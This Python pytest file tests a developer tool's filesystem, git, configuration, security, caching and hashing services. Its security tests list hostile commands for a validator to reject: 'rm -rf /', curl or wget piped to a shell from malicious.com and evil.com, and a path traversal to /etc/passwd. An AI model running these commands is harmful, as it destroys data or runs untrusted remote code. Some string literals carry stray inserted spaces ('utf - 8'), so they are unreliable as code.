import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest
from rich.console import Console

from crackerjack.errors import ConfigError, FileError
from crackerjack.services.cache import CrackerjackCache, FileCache, InMemoryCache
from crackerjack.services.config import ConfigurationService
from crackerjack.services.file_hasher import FileHasher
from crackerjack.services.filesystem import FileSystemService
from crackerjack.services.git import GitService
from crackerjack.services.security import SecurityService


@pytest.fixture
def console():
    return Console()


@pytest.fixture
def pkg_path(tmp_path):
    return tmp_path


@pytest.fixture
def temp_dir():
    with tempfile.TemporaryDirectory() as temp:
        yield Path(temp)


class TestFileSystemService:
    @pytest.fixture
    def fs_service(self):
        return FileSystemService()

    def test_init(self, fs_service) -> None:
        assert fs_service is not None

    @patch("pathlib.Path.read_text")
    def test_read_file_success(self, mock_read, fs_service) -> None:
        mock_read.return_value = "file content"

        content = fs_service.read_file("test.py")

        assert content == "file content"
        mock_read.assert_called_once()

    @patch("pathlib.Path.read_text")
    def test_read_file_error(self, mock_read, fs_service) -> None:
        mock_read.side_effect = FileNotFoundError()

        with pytest.raises(FileError):
            fs_service.read_file("nonexistent.py")

    @patch("pathlib.Path.write_text")
    def test_write_file_success(self, mock_write, fs_service) -> None:
        fs_service.write_file("test.py", "content")

        mock_write.assert_called_once_with("content", encoding="utf - 8")

    @patch("pathlib.Path.write_text")
    def test_write_file_error(self, mock_write, fs_service) -> None:
        mock_write.side_effect = PermissionError()

        with pytest.raises(FileError):
            fs_service.write_file("test.py", "content")

    @patch("pathlib.Path.exists")
    def test_exists(self, mock_exists, fs_service) -> None:
        mock_exists.return_value = True

        result = fs_service.exists("test.py")

        assert result is True
        mock_exists.assert_called_once()

    def test_copy_file(self, fs_service) -> None:
        with patch("shutil.copy2") as mock_copy:
            fs_service.copy_file("source.py", "dest.py")
            mock_copy.assert_called_once()

    def test_move_file(self, fs_service) -> None:
        with patch("shutil.move") as mock_move:
            fs_service.move_file("source.py", "dest.py")
            mock_move.assert_called_once()

    def test_delete_file(self, fs_service) -> None:
        with patch("pathlib.Path.unlink") as mock_unlink:
            fs_service.delete_file("test.py")
            mock_unlink.assert_called_once()

    def test_create_directory(self, fs_service) -> None:
        with patch("pathlib.Path.mkdir") as mock_mkdir:
            fs_service.create_directory("test_dir")
            mock_mkdir.assert_called_once()


class TestGitService:
    @pytest.fixture
    def git_service(self, console, pkg_path):
        return GitService(console, pkg_path)

    def test_init(self, git_service, console, pkg_path) -> None:
        assert git_service.console == console
        assert git_service.pkg_path == pkg_path

    def test_is_git_repo_true(self, git_service) -> None:
        with patch.object(Path, "exists", return_value=True):
            assert git_service.is_git_repo() is True

    def test_is_git_repo_false(self, git_service) -> None:
        with patch.object(Path, "exists", return_value=False):
            assert git_service.is_git_repo() is False

    @patch("subprocess.run")
    def test_get_changed_files(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(returncode=0, stdout="file1.py\nfile2.py\n")

        files = git_service.get_changed_files()

        assert files == ["file1.py", "file2.py"]
        mock_run.assert_called_once()

    @patch("subprocess.run")
    def test_get_changed_files_error(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(returncode=1)

        files = git_service.get_changed_files()

        assert files == []

    @patch("subprocess.run")
    def test_commit_success(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(returncode=0)

        result = git_service.commit("Test commit")

        assert result is True
        assert mock_run.call_count == 2

    @patch("subprocess.run")
    def test_commit_failure(self, mock_run, git_service) -> None:
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=1),
        ]

        result = git_service.commit("Test commit")

        assert result is False

    @patch("subprocess.run")
    def test_push_success(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(returncode=0)

        result = git_service.push()

        assert result is True
        mock_run.assert_called_once()

    @patch("subprocess.run")
    def test_add_files(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(returncode=0)

        result = git_service.add_files(["file1.py", "file2.py"])

        assert result is True
        mock_run.assert_called_once()

    @patch("subprocess.run")
    def test_get_current_branch(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(returncode=0, stdout="main\n")

        branch = git_service.get_current_branch()

        assert branch == "main"

    @patch("subprocess.run")
    def test_get_commit_hash(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(returncode=0, stdout="abc123\n")

        commit_hash = git_service.get_commit_hash()

        assert commit_hash == "abc123"

    @patch("subprocess.run")
    def test_tag_commit(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(returncode=0)

        result = git_service.tag_commit("v1.0.0", "Release message")

        assert result is True

    @patch("subprocess.run")
    def test_get_remote_url(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(
            returncode=0, stdout="https: // github.com / user / repo.git\n"
        )

        url = git_service.get_remote_url()

        assert url == "https: // github.com / user / repo.git"

    @patch("subprocess.run")
    def test_is_clean_working_tree(self, mock_run, git_service) -> None:
        mock_run.return_value = Mock(returncode=0, stdout="")

        result = git_service.is_clean_working_tree()

        assert result is True

    def test_generate_commit_message(self, git_service) -> None:
        files = ["file1.py", "file2.py"]

        message = git_service.generate_commit_message(files)

        assert isinstance(message, str)
        assert len(message) > 0


class TestConfigurationService:
    @pytest.fixture
    def config_service(self, console, pkg_path):
        return ConfigurationService(console, pkg_path)

    def test_init(self, config_service, console, pkg_path) -> None:
        assert config_service.console == console
        assert config_service.pkg_path == pkg_path
        assert config_service.pyproject_path == pkg_path / "pyproject.toml"

    @patch("pathlib.Path.exists")
    def test_pyproject_exists_true(self, mock_exists, config_service) -> None:
        mock_exists.return_value = True

        assert config_service.pyproject_exists() is True

    @patch("pathlib.Path.exists")
    def test_pyproject_exists_false(self, mock_exists, config_service) -> None:
        mock_exists.return_value = False

        assert config_service.pyproject_exists() is False

    @patch("pathlib.Path.read_text")
    def test_read_pyproject_success(self, mock_read, config_service) -> None:
        mock_read.return_value = """
[project]
name = "test - project"
version = "1.0.0"
"""

        data = config_service.read_pyproject()

        assert data["project"]["name"] == "test - project"
        assert data["project"]["version"] == "1.0.0"

    @patch("pathlib.Path.read_text")
    def test_read_pyproject_invalid(self, mock_read, config_service) -> None:
        mock_read.return_value = "invalid toml"

        with pytest.raises(ConfigError):
            config_service.read_pyproject()

    @patch("pathlib.Path.write_text")
    def test_write_pyproject(self, mock_write, config_service) -> None:
        data = {"project": {"name": "test", "version": "1.0.0"}}

        config_service.write_pyproject(data)

        mock_write.assert_called_once()

    @patch("pathlib.Path.read_text")
    def test_get_project_name(self, mock_read, config_service) -> None:
        mock_read.return_value = """
[project]
name = "test - project"
"""

        name = config_service.get_project_name()

        assert name == "test - project"

    @patch("pathlib.Path.read_text")
    def test_get_project_version(self, mock_read, config_service) -> None:
        mock_read.return_value = """
[project]
version = "1.0.0"
"""

        version = config_service.get_project_version()

        assert version == "1.0.0"

    @patch("pathlib.Path.read_text")
    @patch("pathlib.Path.write_text")
    def test_update_version(self, mock_write, mock_read, config_service) -> None:
        mock_read.return_value = """
[project]
name = "test"
version = "1.0.0"
"""

        config_service.update_version("1.0.1")

        mock_write.assert_called_once()

    def test_validate_config_data(self, config_service) -> None:
        valid_data = {"project": {"name": "test", "version": "1.0.0"}}
        invalid_data = {"invalid": "data"}

        assert config_service.validate_config_data(valid_data) is True
        assert config_service.validate_config_data(invalid_data) is False

    @patch("pathlib.Path.exists")
    @patch("pathlib.Path.read_text")
    def test_generate_precommit_config(
        self, mock_read, mock_exists, config_service
    ) -> None:
        mock_exists.return_value = False

        config = config_service.generate_precommit_config()

        assert "repos" in config
        assert isinstance(config["repos"], list)

    @patch("pathlib.Path.write_text")
    def test_write_precommit_config(self, mock_write, config_service) -> None:
        config = {"repos": []}

        config_service.write_precommit_config(config)

        mock_write.assert_called_once()

    def test_get_dependency_list(self, config_service) -> None:
        with patch.object(config_service, "read_pyproject") as mock_read:
            mock_read.return_value = {
                "project": {"dependencies": ["pytest >= 6.0", "rich >= 10.0"]}
            }

            deps = config_service.get_dependency_list()

            assert len(deps) == 2
            assert "pytest >= 6.0" in deps


class TestSecurityService:
    @pytest.fixture
    def security_service(self):
        return SecurityService()

    def test_init(self, security_service) -> None:
        assert security_service is not None
        assert hasattr(security_service, "validate_command")

    def test_validate_command_safe(self, security_service) -> None:
        result = security_service.validate_command(["echo", "hello"])
        assert result is True

    def test_validate_command_unsafe(self, security_service) -> None:
        result = security_service.validate_command(["rm", " - rf", " / "])
        assert result is False

    def test_validate_command_forbidden_patterns(self, security_service) -> None:
        unsafe_commands = [
            ["sudo", "rm", "file"],
            ["chmod", "777", " / "],
            ["curl", "http: // malicious.com", " | ", "bash"],
            ["wget", " - O", " - ", "http: // evil.com", " | ", "sh"],
        ]

        for cmd in unsafe_commands:
            assert security_service.validate_command(cmd) is False

    @patch("os.environ.get")
    def test_get_token_from_env(self, mock_env, security_service) -> None:
        mock_env.return_value = "test_token"

        token = security_service.get_token("TEST_TOKEN")

        assert token == "test_token"
        mock_env.assert_called_once_with("TEST_TOKEN")

    @patch("os.environ.get")
    @patch("subprocess.run")
    def test_get_token_from_keyring(self, mock_run, mock_env, security_service) -> None:
        mock_env.return_value = None
        mock_run.return_value = Mock(returncode=0, stdout="keyring_token")

        token = security_service.get_token("TEST_TOKEN")

        assert token == "keyring_token"

    @patch("os.environ.get")
    @patch("subprocess.run")
    def test_get_token_keyring_failure(
        self, mock_run, mock_env, security_service
    ) -> None:
        mock_env.return_value = None
        mock_run.return_value = Mock(returncode=1)

        token = security_service.get_token("TEST_TOKEN")

        assert token is None

    def test_sanitize_path(self, security_service) -> None:
        safe_path = " / safe / path / file.txt"
        unsafe_path = " / safe / path / .. / .. / .. / etc / passwd"

        assert security_service.sanitize_path(safe_path) == safe_path
        assert security_service.sanitize_path(unsafe_path) != unsafe_path

    def test_validate_file_extension(self, security_service) -> None:
        allowed_extensions = [".py", ".txt", ".yaml"]

        assert (
            security_service.validate_file_extension("file.py", allowed_extensions)
            is True
        )
        assert (
            security_service.validate_file_extension("file.exe", allowed_extensions)
            is False
        )

    def test_create_secure_temp_file(self, security_service) -> None:
        temp_file = security_service.create_secure_temp_file()

        assert temp_file.exists()
        temp_file.unlink()

    def test_hash_sensitive_data(self, security_service) -> None:
        data = "sensitive_password"

        hashed = security_service.hash_sensitive_data(data)

        assert hashed != data
        assert len(hashed) > 0

    def test_mask_secrets_in_output(self, security_service) -> None:
        output = "Password: secret123 and token: abc - def - ghi"
        secrets = ["secret123", "abc - def - ghi"]

        masked = security_service.mask_secrets_in_output(output, secrets)

        assert "secret123" not in masked
        assert "abc - def - ghi" not in masked
        assert " *** " in masked


class TestInMemoryCache:
    @pytest.fixture
    def cache(self):
        return InMemoryCache(max_entries=3, default_ttl=3600)

    def test_init(self, cache) -> None:
        assert cache.max_entries == 3
        assert cache.default_ttl == 3600
        assert len(cache._cache) == 0

    def test_set_and_get(self, cache) -> None:
        cache.set("key1", "value1")

        value = cache.get("key1")
        assert value == "value1"

    def test_get_nonexistent(self, cache) -> None:
        value = cache.get("nonexistent")
        assert value is None

    def test_eviction_when_full(self, cache) -> None:
        cache.set("key1", "value1")
        cache.set("key2", "value2")
        cache.set("key3", "value3")

        cache.get("key1")

        cache.set("key4", "value4")

        assert cache.get("key1") == "value1"
        assert cache.get("key2") is None
        assert cache.get("key3") == "value3"
        assert cache.get("key4") == "value4"

    def test_invalidate(self, cache) -> None:
        cache.set("key1", "value1")

        result = cache.invalidate("key1")

        assert result is True
        assert cache.get("key1") is None

    def test_clear(self, cache) -> None:
        cache.set("key1", "value1")
        cache.set("key2", "value2")

        cache.clear()

        assert len(cache._cache) == 0
        assert cache.get("key1") is None

    def test_cleanup_expired(self, cache) -> None:
        cache.set("key1", "value1", ttl_seconds=0)
        cache.set("key2", "value2", ttl_seconds=3600)

        removed = cache.cleanup_expired()

        assert removed == 1
        assert cache.get("key1") is None
        assert cache.get("key2") == "value2"


class TestFileCache:
    @pytest.fixture
    def file_cache(self, temp_dir):
        return FileCache(temp_dir, "test")

    def test_init(self, file_cache, temp_dir) -> None:
        assert file_cache.cache_dir == temp_dir / "test"
        assert file_cache.cache_dir.exists()

    def test_set_and_get(self, file_cache) -> None:
        file_cache.set("key1", {"data": "value1"})

        value = file_cache.get("key1")
        assert value == {"data": "value1"}

    def test_get_nonexistent(self, file_cache) -> None:
        value = file_cache.get("nonexistent")
        assert value is None

    def test_invalidate(self, file_cache) -> None:
        file_cache.set("key1", "value1")

        result = file_cache.invalidate("key1")

        assert result is True
        assert file_cache.get("key1") is None

    def test_clear(self, file_cache) -> None:
        file_cache.set("key1", "value1")
        file_cache.set("key2", "value2")

        file_cache.clear()

        assert file_cache.get("key1") is None
        assert file_cache.get("key2") is None

    def test_cleanup_expired(self, file_cache) -> None:
        file_cache.set("key1", "value1", ttl_seconds=0)
        file_cache.set("key2", "value2", ttl_seconds=3600)

        removed = file_cache.cleanup_expired()

        assert removed >= 1
        assert file_cache.get("key2") == "value2"


class TestCrackerjackCache:
    @pytest.fixture
    def cache(self, temp_dir):
        return CrackerjackCache(temp_dir, enable_disk_cache=True)

    def test_init(self, cache, temp_dir) -> None:
        assert cache.cache_dir == temp_dir
        assert cache.enable_disk_cache is True
        assert cache.hook_results_cache is not None
        assert cache.file_hash_cache is not None
        assert cache.config_cache is not None

    def test_hook_result_caching(self, cache) -> None:
        from crackerjack.models.task import HookResult

        result = HookResult(id="test", name="test", status="passed", duration=1.0)
        file_hashes = ["hash1", "hash2"]

        cache.set_hook_result("test_hook", file_hashes, result)
        cached_result = cache.get_hook_result("test_hook", file_hashes)

        assert cached_result == result

    def test_file_hash_caching(self, cache, temp_dir) -> None:
        test_file = temp_dir / "test.txt"
        test_file.write_text("content")

        cache.set_file_hash(test_file, "test_hash")
        cached_hash = cache.get_file_hash(test_file)

        assert cached_hash == "test_hash"

    def test_config_data_caching(self, cache) -> None:
        config_data = {"test": "config"}

        cache.set_config_data("test_config", config_data)
        cached_data = cache.get_config_data("test_config")

        assert cached_data == config_data

    def test_invalidate_hook_cache_specific(self, cache) -> None:
        from crackerjack.models.task import HookResult

        result = HookResult(id="test", name="test", status="passed", duration=1.0)
        cache.set_hook_result("test_hook", ["hash1"], result)
        cache.set_hook_result("other_hook", ["hash2"], result)

        cache.invalidate_hook_cache("test_hook")

        assert cache.get_hook_result("test_hook", ["hash1"]) is None
        assert cache.get_hook_result("other_hook", ["hash2"]) is not None

    def test_invalidate_hook_cache_all(self, cache) -> None:
        from crackerjack.models.task import HookResult

        result = HookResult(id="test", name="test", status="passed", duration=1.0)
        cache.set_hook_result("test_hook", ["hash1"], result)
        cache.set_hook_result("other_hook", ["hash2"], result)

        cache.invalidate_hook_cache()

        assert cache.get_hook_result("test_hook", ["hash1"]) is None
        assert cache.get_hook_result("other_hook", ["hash2"]) is None

    def test_cleanup_all(self, cache) -> None:
        results = cache.cleanup_all()

        assert "hook_results" in results
        assert "file_hashes" in results
        assert "config" in results
        assert "disk_cache" in results
        assert all(isinstance(v, int) for v in results.values())

    def test_get_cache_stats(self, cache) -> None:
        stats = cache.get_cache_stats()

        assert "hook_results" in stats
        assert "file_hashes" in stats
        assert "config" in stats
        assert "disk_cache" in stats

        for cache_stats in stats.values():
            assert "hits" in cache_stats
            assert "misses" in cache_stats


class TestFileHasher:
    @pytest.fixture
    def file_hasher(self):
        return FileHasher()

    def test_init(self, file_hasher) -> None:
        assert file_hasher._cache == {}
        assert file_hasher._hash_cache == {}

    def test_get_content_hash(self, file_hasher) -> None:
        content = "test content"
        hash_value = file_hasher.get_content_hash(content)

        assert isinstance(hash_value, str)
        assert len(hash_value) == 64

    def test_get_content_hash_consistent(self, file_hasher) -> None:
        content = "test content"
        hash1 = file_hasher.get_content_hash(content)
        hash2 = file_hasher.get_content_hash(content)

        assert hash1 == hash2

    @patch("pathlib.Path.stat")
    @patch("pathlib.Path.read_bytes")
    def test_get_file_hash(self, mock_read, mock_stat, file_hasher) -> None:
        mock_stat.return_value = Mock(st_mtime=12345)
        mock_read.return_value = b"file content"

        hash1 = file_hasher.get_file_hash(Path("test.py"))
        hash2 = file_hasher.get_file_hash(Path("test.py"))

        assert hash1 == hash2
        assert isinstance(hash1, str)
        mock_read.assert_called_once()

    @patch("pathlib.Path.iterdir")
    @patch("pathlib.Path.is_file")
    def test_get_directory_hash(self, mock_is_file, mock_iterdir, file_hasher) -> None:
        file1 = Mock()
        file1.is_file.return_value = True

        file2 = Mock()
        file2.is_file.return_value = True

        mock_iterdir.return_value = [file1, file2]

        with patch.object(file_hasher, "get_file_hash") as mock_get_hash:
            mock_get_hash.return_value = "test_hash"

            hash_value = file_hasher.get_directory_hash(Path("test_dir"))

            assert isinstance(hash_value, str)

    def test_clear_cache(self, file_hasher) -> None:
        file_hasher._cache["test"] = "value"
        file_hasher._hash_cache["test"] = "hash"

        file_hasher.clear_cache()

        assert len(file_hasher._cache) == 0
        assert len(file_hasher._hash_cache) == 0

    def test_get_cache_stats(self, file_hasher) -> None:
        file_hasher._cache["test1"] = "value1"
        file_hasher._hash_cache["test2"] = "hash2"

        stats = file_hasher.get_cache_stats()

        assert stats["cache_entries"] == 1
        assert stats["hash_entries"] == 1
